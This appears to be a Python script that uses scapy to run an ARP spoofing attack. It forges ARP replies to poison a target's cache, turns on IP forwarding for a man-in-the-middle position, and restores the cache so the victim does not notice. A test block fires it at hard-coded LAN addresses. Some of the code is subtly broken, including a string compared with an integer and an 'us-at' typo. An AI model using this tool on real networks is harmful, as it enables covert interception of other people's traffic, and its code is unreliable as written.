from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys
import subprocess

def enable_linuxip():
    # EnablesIP Forward in linux
    filepath = "/proc/sys/net/ipv4/ip_forward"  # linux os variable that allows the
    with open(filepath) as f:  # ip forwarding to be turned on
        if f.read() == 1:  # or off
            return  # 1 is already enabled and 0 means disabled
    with open(filepath, "w") as f:
        print(1, file=f)


def getMacAddr(ip):
    # using an IP address, it will return the mac address of an IP if it's up.
    # if the IP is down none is returned.
    result, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') /
                    ARP(pdst=ip), timeout=3, verbose=0)
    if result:
        return result[0][1].src
    
def spoof(targetIP, hostIP, verbose=True) -> str:
    #will spoof the targetIP pretending to be the 'hostIP' argument, this is done by changing the ARP cache of the target IP.

    #first we get the macAddr of the target
    targetMac = getMacAddr(targetIP)

    #create an ARP response ('is-at' ARP operation packet).
     
    arpResponse = ARP(pdst=targetIP, hwdst= targetMac, psrc=hostIP, op='is-at')
    
    #verbose = 0 means a packet will be sent without printing anything
    send(arpResponse, verbose=0)
    if verbose:
        #obtain MAC address of our default interface
        myMac = ARP().hwsrc
        ret_str = f'[+] Sent to {targetIP} : {hostIP} us-at {myMac}'
        print(ret_str)
        return ret_str


def restore(targetIP, hostIP, verbose=True) -> str:
    #must reset everything or else the targets internet will crash
    #and the target will know an attack has happened
    target_mac = getMacAddr(targetIP) # the real MAC address of target
    host_mac = getMacAddr(hostIP)#the real MAC address of spoofed router
    arp_response = ARP(pdst=targetIP, hwdst=target_mac, psrc=hostIP, hwsrc=host_mac) # crafting the restoring packet
    send(arp_response, verbose=0, count=7)# sending the restoring packet
    if verbose:
        ret_str = f'[+] Sent to {targetIP} : {hostIP} is-at {host_mac}'
        print(ret_str)
        return ret_str



# for testing
sys.stdout = open("output.txt", "w+")
        
targetIP = '192.168.1.1'

#enable_linuxip()
print(getMacAddr('192.168.0.1'))
restore('192.168.0.63',targetIP,True)

spoof(targetIP, '192.168.1.144')



